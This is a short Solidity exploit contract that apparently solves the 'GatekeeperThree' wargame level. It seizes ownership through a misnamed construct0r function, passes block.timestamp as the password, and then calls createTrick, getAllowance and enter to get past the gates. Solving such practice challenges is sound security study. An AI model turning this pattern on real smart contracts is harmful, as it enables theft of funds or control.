// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import {GatekeeperThree} from "../levels/GatekeeperThree.sol";

contract GatekeeperThreeAttack {
    GatekeeperThree private immutable gatekeeperThree;
    constructor(address payable _gatekeeperThree){
        gatekeeperThree = GatekeeperThree(_gatekeeperThree);
    }
    function attack() external {
        gatekeeperThree.construct0r();
        uint256  password = block.timestamp;
        gatekeeperThree.createTrick();
        gatekeeperThree.getAllowance(password);
        gatekeeperThree.enter();
    }
}
